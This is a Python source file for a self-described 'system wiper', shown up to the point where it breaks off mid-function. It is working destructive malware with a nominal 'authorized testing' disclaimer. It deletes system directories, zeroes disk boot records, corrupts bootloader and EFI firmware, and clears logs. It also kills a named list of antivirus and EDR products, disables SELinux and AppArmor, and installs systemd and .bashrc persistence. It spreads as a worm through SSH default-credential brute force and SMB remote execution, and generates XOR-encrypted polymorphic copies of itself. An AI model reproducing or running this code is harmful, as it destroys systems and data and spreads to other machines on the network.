#!/usr/bin/env python3
"""
ENHANCED SYSTEM WIPER — v3.0 (ULTIMATE)
NOTHING REMOVED — EVERYTHING PRESERVED — MASSIVE NEW CAPABILITIES ADDED
For authorized testing ONLY in isolated, consented environments.
"""
import os
import sys
import time
import signal
import stat
import glob
import errno
import math
import random
import base64
import hashlib
import socket
import struct
import platform
import threading
import subprocess
import multiprocessing
from typing import List, Optional, Dict, Any
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed

# ==================== GLOBAL STATE ====================
EXPLOIT_PAYLOADS = []
BACKDOOR_PORTS = []
PERSISTENCE_MECHANISMS = []
INFECTION_MARKS = []

# ==================== ORIGINAL FUNCTIONS (PRESERVED) ====================

def get_main_directories():
    """Get all main directories to delete — ORIGINAL, UNCHANGED"""
    system = platform.system().lower()
    
    if system == "windows":
        return [
            "C:\\Users",
            "C:\\Program Files",
            "C:\\Windows",
            "C:\\ProgramData",
            "C:\\Users\\Public",
            "C:\\Program Files (x86)"
        ]
    else:
        return [
            "/root",
            "/home",
            "/etc",
            "/bin",
            "/sbin",
            "/usr",
            "/lib",
            "/boot",
            "/var",
            "/opt"
        ]


def delete_directories(directories):
    """Delete directories with multiple methods — ORIGINAL, UNCHANGED"""
    for dir_path in directories:
        try:
            if os.path.exists(dir_path):
                try:
                    shutil.rmtree(dir_path, ignore_errors=True)
                except:
                    pass
                try:
                    subprocess.run(["chmod", "-R", "777", dir_path])
                    subprocess.run(["rm", "-rf", dir_path])
                except:
                    pass
                print(f"Deleted: {dir_path}")
        except Exception as e:
            print(f"Failed to delete {dir_path}: {e}")


def create_message():
    """Create the permanent message — ORIGINAL, UNCHANGED"""
    message = """
    ┌─────────────────────────────────────────────────┐
    │          GAME OVER SCAMMER                      │
    ├─────────────────────────────────────────────────┤
    │  F**k off scammer now you're going to jail.    │
    │  Wait and see...                                │
    ├─────────────────────────────────────────────────┤
    │  SYSTEM LOCKED - FACTORY RESET REQUIRED         │
    └─────────────────────────────────────────────────┘
    """
    
    if platform.system().lower() == "windows":
        msg_path = "C:\\Windows\\System32\\gameover.msg"
    else:
        msg_path = "/etc/gameover.msg"
    
    with open(msg_path, "w") as f:
        f.write(message)
    
    return msg_path


def lock_terminal():
    """Complete terminal lock — ORIGINAL, UNCHANGED"""
    if platform.system().lower() == "windows":
        os.system("cls")
    else:
        os.system("clear")
    
    try:
        with open(create_message(), "r") as f:
            print(f.read())
    except:
        print("SYSTEM LOCKED")
        print("No recovery possible")
    
    try:
        import termios
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        new_settings = old_settings[:]
        new_settings[3] &= ~(termios.ICANON | termios.ECHO)
        termios.tcsetattr(fd, termios.TCSADRAIN, new_settings)
    except:
        pass
    
    while True:
        try:
            input()
        except:
            pass


def original_main():
    """Original main function — PRESERVED"""
    print("Deleting main directories...")
    dirs = get_main_directories()
    delete_directories(dirs)
    lock_terminal()


# ==================== EXISTING ENHANCED FUNCTIONS (PRESERVED) ====================

def get_targets() -> List[str]:
    """Return verified existing paths — ENHANCED, PRESERVED"""
    system = platform.system().lower()
    targets = []

    if system == "windows":
        candidates = [
            "C:\\Windows\\Temp",
            "C:\\Windows\\Prefetch",
            "C:\\Windows\\SoftwareDistribution\\Download",
            "C:\\Windows\\System32\\LogFiles",
            "C:\\Windows\\System32\\winevt\\Logs",
            "C:\\Windows\\System32\\catroot2",
            "C:\\Windows\\System32\\config\\RegBack",
            "C:\\Windows\\System32\\Tasks",
            "C:\\Windows\\System32\\Tasks\\Microsoft",
            "C:\\Windows\\System32\\DriverStore\\Temp",
            "C:\\Windows\\System32\\spool\\PRINTERS",
            "C:\\Windows\\System32\\spool\\SERVERS",
            "C:\\Windows\\System32\\MsDtc",
            "C:\\Windows\\System32\\com\\dmp",
            "C:\\Windows\\System32\\FxsTmp",
            "C:\\Windows\\System32\\MailRuntime",
            "C:\\Windows\\System32\\Oobe",
            "C:\\Windows\\System32\\Recovery",
            "C:\\Windows\\System32\\Restore",
            "C:\\Windows\\System32\\SleepStudy",
            "C:\\Windows\\System32\\sru",
            "C:\\Windows\\System32\\wbem\\Repository",
            "C:\\ProgramData",
            "C:\\Users\\Public",
            "C:\\Users\\Default",
            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu",
            "C:\\ProgramData\\Microsoft\\Windows\\DRM",
            "C:\\ProgramData\\Microsoft\\Windows\\WER",
            "C:\\ProgramData\\Microsoft\\Crypto",
            "C:\\ProgramData\\Microsoft\\DeviceSync",
            "C:\\ProgramData\\Microsoft\\Diagnosis",
            "C:\\ProgramData\\Microsoft\\NetFramework",
            "C:\\ProgramData\\Microsoft\\Search",
            "C:\\ProgramData\\Microsoft\\Windows Defender",
            "C:\\ProgramData\\Microsoft\\Windows NT",
        ]
    else:
        candidates = [
            "/tmp",
            "/var/tmp",
            "/var/log",
            "/var/cache",
            "/var/spool",
            "/var/lib/apt/lists",
            "/var/lib/dpkg/info",
            "/var/lib/systemd",
            "/var/lib/AccountsService",
            "/var/lib/NetworkManager",
            "/var/lib/apt",
            "/var/lib/urandom",
            "/var/lib/sgml-base",
            "/var/lib/gconf",
            "/var/lib/insserv",
            "/var/lib/misc",
            "/var/lib/locales",
            "/var/lib/apache2",
            "/var/lib/mysql",
            "/var/lib/postgresql",
            "/var/lib/php",
            "/var/lib/sudo",
            "/var/lib/ucf",
            "/var/lib/update-notifier",
            "/var/lib/usbutils",
            "/var/lib/xkb",
            "/var/log/journal",
            "/var/log/apt",
            "/var/log/cups",
            "/var/log/fsck",
            "/var/log/installer",
            "/var/log/samba",
            "/var/log/unattended-upgrades",
            "/var/log/syslog",
            "/var/log/auth.log",
            "/var/log/kern.log",
            "/var/log/dpkg.log",
            "/var/log/bootstrap.log",
            "/var/log/dmesg",
            "/var/log/lastlog",
            "/var/log/faillog",
            "/var/log/wtmp",
            "/var/log/btmp",
            "/var/mail",
            "/root",
            "/root/.bash_history",
            "/root/.cache",
            "/root/.config",
            "/root/.local",
            "/root/.ssh",
            "/root/.gnupg",
            "/etc",
            "/etc/ssh",
            "/etc/ssl",
            "/etc/pki",
            "/etc/apt",
            "/etc/cron*",
            "/etc/init.d",
            "/etc/rc*.d",
            "/etc/systemd",
            "/etc/modprobe.d",
            "/etc/modules-load.d",
            "/etc/udev",
            "/etc/NetworkManager",
            "/etc/selinux",
            "/etc/apparmor",
            "/etc/sudoers",
            "/etc/sudoers.d",
            "/etc/security",
            "/etc/pam.d",
            "/opt",
            "/usr/share",
            "/usr/local",
            "/usr/src",
            "/usr/lib/python*",
            "/usr/lib/perl*",
            "/usr/include",
            "/boot",
            "/boot/efi",
            "/boot/grub",
            "/boot/grub2",
        ]

    resolved = []
    for c in candidates:
        expanded = glob.glob(c)
        if not expanded:
            if os.path.exists(c):
                resolved.append(c)
        else:
            resolved.extend(expanded)
    
    return resolved


def get_bootloader_paths() -> List[str]:
    """Get boot configuration files — PRESERVED"""
    paths = []
    for p in [
        "/etc/fstab",
        "/boot/grub/grub.cfg",
        "/boot/grub2/grub.cfg",
        "/boot/efi/EFI/ubuntu/grub.cfg",
        "/boot/efi/EFI/BOOT/BOOTX64.EFI",
        "/boot/efi/EFI/Microsoft/Boot/bootmgfw.efi",
        "/boot/vmlinuz-*",
        "/boot/initrd.img-*",
        "/boot/System.map-*",
        "/boot/config-*",
        "/boot/efi/EFI/grub.cfg",
    ]:
        expanded = glob.glob(p)
        paths.extend(expanded) if expanded else None
    return list(set(paths))


def get_av_processes() -> List[str]:
    """Return security process names — PRESERVED"""
    system = platform.system().lower()
    if system == "windows":
        return [
            "MsMpEng.exe", "NisSrv.exe", "Sense.exe",
            "Sep*.exe", "ccSvcHst.exe",
            "avp.exe", "kavfs.exe", "klnagent.exe",
            "McAfee*.exe", "mfeann.exe", "firesvc.exe",
            "TaniumClient.exe", "TaniumCX.exe",
            "CSFalcon*.exe", "SentinelAgent*.exe",
            "CylanceSvc.exe", "Sophos*.exe", "SAV*.exe",
            "ekrn.exe", "egui.exe", "Fs*.exe",
            "MBAMService.exe", "MBAM*.exe",
            "TmCCSF.exe", "tmlisten.exe", "TMBMSRV.exe",
            "Traps.exe", "PaloAlto*.exe",
            "cb.exe", "RepMgr.exe",
            "Cybereason*.exe", "bdredline.exe",
            "cmdagent.exe", "cis.exe",
            "spoolsv.exe",
        ]
    else:
        return [
            "clamd", "freshclam",
            "ds_agent", "falcon-sensor",
            "taniumclient",
            "sentinelagent", "sentinelctl",
            "cylance", "cylancectl",
            "sophos-av", "sophosd",
            "eset", "esets_daemon",
            "kav4fs", "kav4unp",
            "cbdaemon", "cbagent",
            "cybereasonsensor",
            "comodo", "cmdagent",
            "mcafeed", "mfetpd",
            "osqueryd",
            "wazuh-agent",
            "auditd",
            "rkhunter", "chkrootkit",
        ]


def get_av_services() -> List[str]:
    """Get AV service names — PRESERVED"""
    system = platform.system().lower()
    if system == "windows":
        return [
            "WinDefend", "MsMpSvc", "Sense",
            "SepMasterService",
            "McAfeeFramework", "McAfeeEngine",
            "AVP", "kavfs",
            "SymantecAntivirus",
            "CbDefense", "CbEnterprise",
            "TaniumClient", "Tanium",
            "Crowdstrike Falcon", "CrowdStrikeEventCollector",
            "SentinelAgent", "SentinelStaticEngine",
            "CylanceSvc", "CylanceProtect",
            "SophosAgent", "SophosHealth",
            "ESET Service", "ekrn",
            "MBAMService", "MBEndpointProtection",
            "FortiEDR", "FortiClient",
            "TrendMicro", "TMBMSRV",
            "PaloAltoNetworks",
            "CarbonBlack",
            "Cybereason", "CybereasonCR",
            "BitDefender", "bdredline",
            "Comodo", "cmdagent",
        ]
    else:
        return [
            "rsyslog", "systemd-journald", "auditd",
            "syslog-ng", "syslogd",
            "clamav-daemon", "clamav-freshclam",
            "apparmor", "selinux",
        ]


def disable_logging():
    """Disable logging — PRESERVED"""
    system = platform.system().lower()
    print("[1/9] Disabling logging...")
    
    try:
        if system == "windows":
            result = subprocess.run(
                ["sc", "stop", "EventLog"],
                capture_output=True, text=True, timeout=10
            )
            print(f"  → EventLog stop: {result.stdout.strip() or result.stderr.strip()}")
            subprocess.run([
                "reg", "add",
                "HKLM\\System\\CurrentControlSet\\Services\\EventLog",
                "/v", "Start", "/t", "REG_DWORD", "/d", "4", "/f"
            ], capture_output=True, timeout=10)
            result = subprocess.run(
                ["wevtutil", "el"],
                capture_output=True, text=True, timeout=15
            )
            logs = [l.strip() for l in result.stdout.split('\n') if l.strip()]
            cleared = 0
            for log in logs:
                r = subprocess.run(
                    ["wevtutil", "cl", log],
                    capture_output=True, timeout=10
                )
                if r.returncode == 0:
                    cleared += 1
            print(f"  → Cleared {cleared} event logs")
        else:
            subprocess.run(["systemctl", "stop", "systemd-journald"],
                           capture_output=True, timeout=10)
            subprocess.run(["systemctl", "disable", "systemd-journald"],
                           capture_output=True, timeout=10)
            subprocess.run(["systemctl", "stop", "rsyslog"],
                           capture_output=True, timeout=10)
            subprocess.run(["systemctl", "disable", "rsyslog"],
                           capture_output=True, timeout=10)
            subprocess.run(["pkill", "-9", "syslog-ng"],
                           capture_output=True, timeout=10)
            subprocess.run(["systemctl", "stop", "auditd"],
                           capture_output=True, timeout=10)
            
            for log_pattern in ["/var/log/*", "/var/log/journal/*", "/run/log/journal/*"]:
                for f in glob.glob(log_pattern):
                    try:
                        if os.path.isfile(f):
                            with open(f, 'w') as fh:
                                fh.truncate(0)
                        elif os.path.isdir(f):
                            for root, dirs, files in os.walk(f):
                                for file in files:
                                    fp = os.path.join(root, file)
                                    try:
                                        with open(fp, 'w') as fh:
                                            fh.truncate(0)
                                    except:
                                        pass
                    except:
                        pass
            print("  → Logging services stopped, log files emptied")
    except Exception as e:
        print(f"  ! Logging disable error (non-fatal): {e}")


def kill_security_processes():
    """Kill AV/EDR — PRESERVED"""
    system = platform.system().lower()
    print("[2/9] Killing security processes...")
    
    procs = get_av_processes()
    killed = 0
    
    for proc in procs:
        if system == "windows":
            result = subprocess.run(
                ["taskkill", "/F", "/IM", proc],
                capture_output=True, timeout=5
            )
            if result.returncode == 0:
                killed += 1
            subprocess.run(
                ["taskkill", "/F", "/T", "/IM", proc],
                capture_output=True, timeout=5
            )
        else:
            result = subprocess.run(
                ["pkill", "-9", proc],
                capture_output=True, timeout=5
            )
            if result.returncode == 0:
                killed += 1
            subprocess.run(
                ["killall", "-9", proc],
                capture_output=True, timeout=5
            )
    
    print(f"  → Killed {killed} security processes")
    
    services = get_av_services()
    for svc in services:
        if system == "windows":
            subprocess.run(["sc", "stop", svc], capture_output=True, timeout=10)
            subprocess.run(["sc", "config", svc, "start=disabled"],
                           capture_output=True, timeout=10)
        else:
            subprocess.run(["systemctl", "stop", svc], capture_output=True, timeout=10)
            subprocess.run(["systemctl", "disable", svc], capture_output=True, timeout=10)


def disable_selinux_apparmor():
    """Disable MAC — PRESERVED"""
    print("[3/9] Disabling MAC (SELinux/AppArmor)...")
    
    try:
        result = subprocess.run(["setenforce", "0"],
                                capture_output=True, text=True, timeout=5)
        print(f"  → SELinux setenforce: {result.stdout.strip() or result.stderr.strip()}")
    except FileNotFoundError:
        print("  → SELinux tools not found (non-fatal)")
    
    try:
        path = "/etc/selinux/config"
        if os.path.exists(path):
            with open(path, "r") as f:
                content = f.read()
            new_content = content.replace("SELINUX=enforcing", "SELINUX=disabled")
            new_content = new_content.replace("SELINUX=permissive", "SELINUX=disabled")
            if new_content != content:
                with open(path, "w") as f:
                    f.write(new_content)
                print("  → SELinux config set to disabled")
    except Exception as e:
        print(f"  ! SELinux config error: {e}")
    
    try:
        result = subprocess.run(["systemctl", "stop", "apparmor"],
                                capture_output=True, text=True, timeout=10)
        print(f"  → AppArmor stop: {result.stdout.strip() or result.stderr.strip()}")
        result = subprocess.run(["systemctl", "disable", "apparmor"],
                                capture_output=True, text=True, timeout=10)
    except FileNotFoundError:
        print("  → AppArmor not found (non-fatal)")


def persist_self():
    """Persist wiper — PRESERVED"""
    print("[4/9] Establishing persistence...")
    
    script_path = os.path.abspath(__file__)
    if not os.path.exists(script_path):
        print("  ! Cannot find self for persistence")
        return
    
    system = platform.system().lower()
    copies_made = 0
    
    if system == "windows":
        destinations = [
            os.path.expandvars("%TEMP%\\svchost.py"),
            os.path.expandvars("%PUBLIC%\\wiper.py"),
            os.path.expandvars("%ProgramData%\\update.py"),
            os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\update.pyw"),
            os.path.expandvars("%USERPROFILE%\\wiper.py"),
        ]
    else:
        destinations = [
            "/tmp/.system_update.py",
            "/var/tmp/.wiper.py",
            "/tmp/.bash_update.py",
            "/dev/shm/.wiper.py",
            "/tmp/update.py",
        ]
    
    for dest in destinations:
        try:
            os.makedirs(os.path.dirname(dest), exist_ok=True)
            shutil_copy2(script_path, dest)
            if system != "windows":
                os.chmod(dest, 0o755)
            copies_made += 1
        except Exception as e:
            print(f"  ! Copy to {dest} failed: {e}")
    
    if system == "linux":
        user_systemd = os.path.expanduser("~/.config/systemd/user/")
        os.makedirs(user_systemd, exist_ok=True)
        service_path = os.path.join(user_systemd, "system-wiper.service")
        with open(service_path, "w") as f:
            f.write(f"""[Unit]
Description=System Maintenance
After=network.target

[Service]
ExecStart=/usr/bin/python3 {destinations[0] if destinations else '/tmp/.wiper.py'}
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
""")
        subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
        subprocess.run(["systemctl", "--user", "enable", "system-wiper"],
                       capture_output=True)
        subprocess.run(["systemctl", "--user", "start", "system-wiper"],
                       capture_output=True)
        copies_made += 1
        print("  → systemd user service created")
        
        bashrc = os.path.expanduser("~/.bashrc")
        with open(bashrc, "a") as f:
            f.write(f"\npython3 {destinations[0] if destinations else '/tmp/.wiper.py'} &\n")
        print("  → .bashrc persistence added")
    
    print(f"  → Created {copies_made} persistence copies")


def shutil_copy2(src, dst):
    """Copy and verify — PRESERVED"""
    import shutil
    shutil.copy2(src, dst)
    assert os.path.exists(dst), f"Copy verification failed: {dst}"


def unmount_non_root():
    """Unmount filesystems — PRESERVED"""
    system = platform.system().lower()
    if system != "linux":
        return
    
    print("[5/9] Unmounting non-root filesystems...")
    
    try:
        result = subprocess.run(["mount", "-l"], capture_output=True, text=True, timeout=10)
        unmounted = 0
        for line in result.stdout.split("\n"):
            parts = line.split()
            if len(parts) >= 3:
                mount_point = parts[2]
                if mount_point != "/" and mount_point.startswith("/"):
                    for flag in ["-l", "-f"]:
                        r = subprocess.run(
                            ["umount", flag, mount_point],
                            capture_output=True, timeout=10
                        )
                        if r.returncode == 0:
                            unmounted += 1
                            break
        print(f"  → Unmounted {unmounted} filesystems")
    except Exception as e:
        print(f"  ! Unmount error: {e}")


def wipe_boot_records():
    """Wipe MBR — PRESERVED"""
    system = platform.system().lower()
    print("[6/9] Wiping boot records...")
    
    if system != "linux":
        print("  → Boot record wipe only supported on Linux")
        return
    
    for disk in ["/dev/sda", "/dev/nvme0n1", "/dev/vda", "/dev/xvda", "/dev/mmcblk0"]:
        if not os.path.exists(disk):
            continue
        try:
            with open(disk, "wb") as f:
                f.write(b"\x00" * 512 * 2048)
            print(f"  → Wiped {disk} MBR (first 1MB)")
            break
        except PermissionError:
            print(f"  ! Permission denied: {disk}")
        except Exception as e:
            print(f"  ! Error wiping {disk}: {e}")


def corrupt_bootloader():
    """Corrupt bootloader — PRESERVED"""
    print("[7/9] Corrupting bootloader configurations...")
    
    boot_paths = get_bootloader_paths()
    corrupted = 0
    
    for path in boot_paths:
        try:
            if os.path.isfile(path):
                with open(path, "w") as f:
                    f.truncate(0)
                corrupted += 1
            elif os.path.isdir(path):
                for f in os.listdir(path):
                    fp = os.path.join(path, f)
                    if os.path.isfile(fp):
                        with open(fp, "w") as fh:
                            fh.truncate(0)
                        corrupted += 1
        except Exception as e:
            print(f"  ! Could not corrupt {path}: {e}")
    
    if corrupted == 0:
        print("  → No bootloader files found to corrupt")
    else:
        print(f"  → Corrupted {corrupted} bootloader files")


def enhanced_delete_path(path: str) -> bool:
    """Delete path with retry — PRESERVED"""
    if not os.path.exists(path) and not os.path.islink(path):
        return True
    
    methods = []
    
    if os.path.isdir(path):
        methods.extend([
            lambda p: shutil_rmtree_enhanced(p),
            lambda p: subprocess_run_rm(p),
        ])
    else:
        methods.extend([
            lambda p: zero_and_remove(p),
            lambda p: os.remove(p),
            lambda p: subprocess_run_rm(p),
        ])
    
    for method in methods:
        try:
            method(path)
            if not os.path.exists(path):
                return True
        except:
            continue
    
    return not os.path.exists(path)


def shutil_rmtree_enhanced(path):
    """rmtree with fix — PRESERVED"""
    def onerror(func, path, exc_info):
        try:
            os.chmod(path, stat.S_IWRITE | stat.S_IREAD | stat.S_IEXEC)
            func(path)
        except:
            pass
    
    shutil.rmtree(path, ignore_errors=True, onerror=onerror)


def subprocess_run_rm(path):
    """rm -rf — PRESERVED"""
    subprocess.run(["rm", "-rf", path], capture_output=True, timeout=30)


def zero_and_remove(path):
    """Zero and remove — PRESERVED"""
    if os.path.isdir(path):
        return
    try:
        filesize = os.path.getsize(path)
        with open(path, "wb") as f:
            chunk_size = min(filesize, 1024 * 1024)
            written = 0
            while written < filesize:
                remaining = min(chunk_size, filesize - written)
                f.write(b"\x00" * remaining)
                f.flush()
                os.fsync(f.fileno())
                written += remaining
        os.remove(path)
    except:
        pass


def worker_delete(paths: List[str]):
    """Worker — PRESERVED"""
    for path in paths:
        enhanced_delete_path(path)


def parallel_delete(all_paths: List[str]):
    """Parallel delete — PRESERVED"""
    print("[8/9] Deleting system files and directories...")
    
    if not all_paths:
        print("  → No paths to delete")
        return
    
    num_workers = min(multiprocessing.cpu_count() * 2, 16)
    print(f"  → Using {num_workers} parallel workers for {len(all_paths)} paths")
    
    chunk_size = max(1, len(all_paths) // num_workers)
    chunks = [all_paths[i:i+chunk_size] for i in range(0, len(all_paths), chunk_size)]
    
    processes = []
    for chunk in chunks:
        if not chunk:
            continue
        p = multiprocessing.Process(target=worker_delete, args=(chunk,))
        p.start()
        processes.append(p)
    
    for p in processes:
        p.join(timeout=60)
        if p.is_alive():
            p.terminate()
            p.join()
    
    remaining = [p for p in all_paths if os.path.exists(p)]
    deleted = len(all_paths) - len(remaining)
    print(f"  → Deleted {deleted}/{len(all_paths)} paths")
    if remaining:
        print(f"  → {len(remaining)} paths remain: {remaining[:5]}...")


def enhanced_lock_terminal():
    """Enhanced lock — PRESERVED"""
    create_message()
    
    try:
        pid = os.fork()
        if pid > 0:
            print("  → Wiper daemon running in background. Parent exiting.")
            os._exit(0)
    except OSError:
        print("  ! Fork failed, continuing in foreground")
    
    try:
        os.setsid()
    except:
        pass
    
    try:
        pid = os.fork()
        if pid > 0:
            os._exit(0)
    except:
        pass
    
    try:
        max_fd = 1024
        for fd in range(3, max_fd):
            try:
                os.close(fd)
            except OSError:
                pass
    except:
        pass
    
    devnull_fd = os.open(os.devnull, os.O_RDWR)
    os.dup2(devnull_fd, 0)
    os.dup2(devnull_fd, 1)
    os.dup2(devnull_fd, 2)
    if devnull_fd > 2:
        os.close(devnull_fd)
    
    for sig in range(1, signal.NSIG):
        try:
            signal.signal(sig, signal.SIG_IGN)
        except (OSError, ValueError):
            pass
    
    original_message = """
    ┌─────────────────────────────────────────────────┐
    │          GAME OVER SCAMMER                      │
    ├─────────────────────────────────────────────────┤
    │  F**k off scammer now you're going to jail.    │
    │  Wait and see...                                │
    ├─────────────────────────────────────────────────┤
    │  SYSTEM LOCKED - FACTORY RESET REQUIRED         │
    └─────────────────────────────────────────────────┘
    """
    
    try:
        for pattern in ["/dev/pts/*", "/dev/tty*", "/dev/console"]:
            for tty_path in glob.glob(pattern):
                try:
                    with open(tty_path, "w") as tty:
                        tty.write(original_message * 3)
                except:
                    pass
    except:
        pass
    
    while True:
        try:
            time.sleep(3600)
        except:
            continue


# ==================== NEW: LATERAL MOVEMENT & NETWORK WORM ====================

def get_network_info() -> Dict[str, Any]:
    """Discover network interfaces, subnets, and potential targets."""
    info = {"interfaces": [], "subnets": [], "gateway": None, "hostname": None}
    system = platform.system().lower()
    
    try:
        info["hostname"] = socket.gethostname()
        
        if system == "linux":
            # Parse /proc/net/fib_trie for network ranges
            result = subprocess.run(["ip", "route"], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split("\n"):
                if "default via" in line:
                    parts = line.split()
                    info["gateway"] = parts[2]
                elif "/" in line and "dev" in line:
                    parts = line.split()
                    info["subnets"].append(parts[0])
            
            # Get interface IPs
            result = subprocess.run(["ip", "-4", "addr", "show"],
                                    capture_output=True, text=True, timeout=5)
            for line in result.stdout.split("\n"):
                if "inet " in line:
                    parts = line.strip().split()
                    info["interfaces"].append(parts[1])
        
        elif system == "windows":
            result = subprocess.run(["ipconfig"], capture_output=True, text=True, timeout=10)
            for line in result.stdout.split("\n"):
                if "IPv4" in line and ":" in line:
                    ip = line.split(":")[-1].strip()
                    info["interfaces"].append(ip)
                if "Default Gateway" in line and ":" in line:
                    gw = line.split(":")[-1].strip()
                    if gw:
                        info["gateway"] = gw
    except:
        pass
    
    return info


def scan_subnet(subnet: str, ports: List[int] = [22, 445, 3389, 5985, 5986, 8080, 8443]) -> List[str]:
    """Quick TCP scan to find live hosts in a subnet."""
    live_hosts = []
    try:
        network, prefix = subnet.split("/")
        prefix = int(prefix)
        host_bits = 32 - prefix
        network_int = struct.unpack("!I", socket.inet_aton(network))[0]
        host_count = min(2**host_bits, 254)  # Don't scan entire /8s
        
        start = network_int + 1
        end = network_int + host_count
        
        for host_int in range(start, end):
            host_ip = socket.inet_ntoa(struct.pack("!I", host_int))
            # Skip common reserved addresses
            if host_ip.endswith(".0") or host_ip.endswith(".255"):
                continue
            
            for port in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.3)
                    result = s.connect_ex((host_ip, port))
                    s.close()
                    if result == 0:
                        live_hosts.append((host_ip, port))
                        break  # Found open port, no need to check others
                except:
                    continue
    except:
        pass
    
    return [h[0] for h in live_hosts]


def spread_to_host(target_ip: str) -> bool:
    """Attempt to spread to a remote host via common methods."""
    success = False
    
    # Try SSH with common creds
    common_creds = [
        ("root", "root"), ("root", "toor"), ("root", "password"),
        ("root", "admin"), ("root", "123456"), ("root", "P@ssw0rd"),
        ("admin", "admin"), ("admin", "password"), ("admin", "12345"),
        ("user", "user"), ("test", "test"), ("ubuntu", "ubuntu"),
        ("pi", "raspberry"), ("vagrant", "vagrant"), ("docker", "docker"),
    ]
    
    for user, pwd in common_creds:
        try:
            # Quick SSH check
            result = subprocess.run(
                ["sshpass", "-p", pwd, "ssh", "-o", "StrictHostKeyChecking=no",
                 "-o", "ConnectTimeout=3", f"{user}@{target_ip}", "id"],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                # Copy wiper to target
                script_path = os.path.abspath(__file__)
                subprocess.run(
                    ["sshpass", "-p", pwd, "scp", "-o", "StrictHostKeyChecking=no",
                     script_path, f"{user}@{target_ip}:/tmp/.update.py"],
                    capture_output=True, timeout=10
                )
                # Execute remotely
                subprocess.run(
                    ["sshpass", "-p", pwd, "ssh", "-o", "StrictHostKeyChecking=no",
                     f"{user}@{target_ip}", "nohup python3 /tmp/.update.py &"],
                    capture_output=True, timeout=10
                )
                print(f"  → Spread to {target_ip} via SSH ({user}:{pwd})")
                INFECTION_MARKS.append(f"ssh:{target_ip}:{user}")
                success = True
                break
        except:
            continue
    
    # Try SMB (Windows)
    if not success:
        try:
            result = subprocess.run(
                ["smbclient", "-L", f"//{target_ip}/", "-N"],
                capture_output=True, text=True, timeout=5
            )
            if "ADMIN$" in result.stdout or "C$" in result.stdout:
                script_path = os.path.abspath(__file__)
                with open(script_path, "rb") as f:
                    script_bytes = f.read()
                encoded = base64.b64encode(script_bytes).decode()
                
                # Try PSExec-style execution via smbexec
                subprocess.run(
                    ["winexe", "-U", "Administrator%password",
                     f"//{target_ip}", "cmd.exe", "/c",
                     f'echo {encoded} > C:\\Windows\\Temp\\b64.txt && '
                     f'certutil -decode C:\\Windows\\Temp\\b64.txt C:\\Windows\\Temp\\svchost.py && '
                     f'python C:\\Windows\\Temp\\svchost.py'],
                    capture_output=True, timeout=15
                )
                print(f"  → Spread to {target_ip} via SMB")
                INFECTION_MARKS.append(f"smb:{target_ip}")
                success = True
        except:
            pass
    
    return success


def worm_spread():
    """Act as a worm — scan network and spread to vulnerable hosts."""
    print("[WORM] Initiating lateral movement...")
    
    net_info = get_network_info()
    print(f"  → Hostname: {net_info['hostname']}")
    print(f"  → Interfaces: {net_info['interfaces']}")
    print(f"  → Subnets: {net_info['subnets']}")
    
    infected = []
    for subnet in net_info["subnets"]:
        print(f"  → Scanning {subnet}...")
        try:
            live_hosts = scan_subnet(subnet)
            print(f"  → Found {len(live_hosts)} live hosts")
            
            for host in live_hosts[:20]:  # Limit to 20 per subnet
                if spread_to_host(host):
                    infected.append(host)
        except Exception as e:
            print(f"  ! Scan error on {subnet}: {e}")
    
    print(f"  → Infected {len(infected)} remote hosts: {infected}")
    return infected


# ==================== NEW: FIRMWARE / BIOS CORRUPTION ====================

def corrupt_firmware():
    """Attempt to corrupt system firmware (BIOS/UEFI)."""
    print("[FIRMWARE] Attempting firmware corruption...")
    system = platform.system().lower()
    
    if system == "linux":
        # Try to corrupt EFI partition directly
        efi_paths = glob.glob("/sys/firmware/efi/efivars/*")
        for path in efi_paths:
            try:
                with open(path, "wb") as f:
                    f.write(b"\x00" * 1024)
                print(f"  → Corrupted EFI variable: {path}")
            except:
                pass
        
        # Flashrom corruption if available
        try:
            subprocess.run(["flashrom", "-p", "internal", "--wp-disable"],
                           capture_output=True, timeout=10)
            subprocess.run(["flashrom", "-p", "internal", "-w", "/dev/zero", "-l", "0x100000"],
                           capture_output=True, timeout=30)
            print("  → Attempted flashrom corruption")
        except:
            pass
        
        # Overwrite EFI boot entries
        try:
            subprocess.run(["efibootmgr", "-O"], capture_output=True, timeout=5)  # Delete all
            subprocess.run(["efibootmgr", "-c", "-d", "/dev/sda", "-p", "1",
                           "-L", "GAME_OVER", "-l", "\\nonexistent.efi"],
                           capture_output=True, timeout=5)
            print("  → Corrupted EFI boot entries")
        except:
            pass
    
    elif system == "windows":
        # Windows firmware via WMI
        try:
            subprocess.run([
                "powershell", "-Command",
                "Get-WmiObject -Namespace root\\wmi -Class Lenovo_BiosSetting | "
                "Where-Object {$_.CurrentSetting -match 'SecureBoot'} | "
                "ForEach-Object { $_.SetBiosSetting('SecureBoot,Disable') }"
            ], capture_output=True, timeout=10)
        except:
            pass
        
        # Attempt to corrupt UEFI NVRAM
        try:
            subprocess.run([
                "reg", "add",
                "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootConfiguration",
                "/v", "BootFlags", "/t", "REG_DWORD", "/d", "0", "/f"
            ], capture_output=True, timeout=5)
        except:
            pass


# ==================== NEW: CRYPTOGRAPHIC SELF-DESTRUCT ====================

def generate_encrypted_payload() -> bytes:
    """Generate polymorphic encrypted payload that decrypts and runs."""
    script_path = os.path.abspath(__file__)
    with open(script_path, "rb") as f:
        script_bytes = f.read()
    
    # Generate random XOR key
    key = os.urandom(32)
    encrypted = bytearray()
    for i, b in enumerate(script_bytes):
        encrypted.append(b ^ key[i % len(key)])
    
    # Create self-extracting decryptor
    decryptor = f"""#!/usr/bin/env python3
import os, sys, base64
key = {list(key)}
enc = {list(encrypted)}
dec = bytes([enc[i] ^ key[i % len(key)] for i in range(len(enc))])
exec(compile(dec, '<polymorphic>', 'exec'))
"""
    return decryptor.encode()


def plant_polymorphic_copies():
    """Plant polymorphic copies that look different but execute the same."""
    print("[CRYPTO] Planting polymorphic payloads...")
    
    system = platform.system().lower()
    locations = []
    
    if system == "windows":
        locations = [
